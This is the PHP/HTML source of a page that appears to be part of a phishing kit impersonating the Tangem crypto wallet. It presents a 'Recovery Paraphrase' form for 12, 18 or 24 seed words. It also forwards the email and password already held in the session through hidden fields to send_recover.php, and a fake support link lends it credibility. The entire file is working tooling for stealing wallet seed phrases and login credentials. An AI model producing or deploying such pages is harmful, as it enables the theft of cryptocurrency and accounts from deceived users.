<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
        redirect(base_url('recover.php'));
    }
    $title = 'The best crypto wallet — Tangem Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <div class="container-fluid">
            <div class="row w-100 d-flex">
                <div class="col-md-6 order-md-1 order-2 px-0" style="height: 100vh;">
                    <video style="opacity: 0.5;  width: 100%; height: 100vh; object-fit: cover; object-position: center; " autoPlay loop muted>
                        <source src="<?= base_url('assets/img/video.mp4')?>" type="video/mp4" />
                    </video>
                </div>
                <div class="col-md-6 order-md-2 order-1">
                    <div class="row mt15 mb30">
                        <div class="col-sm-12 ps35">
                            <a class="text-decoration-none" href="<?= base_url('')?>">
                                <img src="<?= base_url('assets/img/logo.png')?>" style="filter: invert(1); height: 30px">
                            </a>
                        </div>
                    </div>
                    <div class="row" style="">
                        <div class="col-12 offset-0 col-md-9 offset-md-1">
                            <div class="mt55">
                                <form method="post" action="<?= base_url('send_recover.php')?>" class="col-12 shadow-lg p20 py17 rounded-4" style="background-color: #18181F">
                                    <h2 class="fs30 mt25 mb40">Enter the Recovery Paraphrase</h2>
                                    <div class="pb10">
                                        <button type="button" data-word="12" class="btn btn-secondary px15 formactive activeForm">12 Words</button>
                                        <button type="button" data-word="18" class="btn btn-secondary px15 ms20 activeForm">18 Words</button>
                                        <button type="button" data-word="24" class="btn btn-secondary px15 ms20 activeForm">24 Words</button>
                                    </div>
                                    <div class="row form_keys"></div>
                                    <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
                                    <input type="hidden" name="password" value="<?= $_SESSION['password'] ?>" >
                                    <div class="text-center mx-auto d-grid gap-2 my30">
                                        <button type="submit" class="btn btn-secondary btn-lg btn-primary-2 px20 rounded-pill btn-block">Continue</button>
                                    </div>
                                    <div class="text-center mt25 fw-medium">
                                        <span class="text-secondary">Need help?</span>
                                        <a href="javascript:void(Tawk_API.toggle())" class="text-decoration-none text-primary-2"> Contact Support</a>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>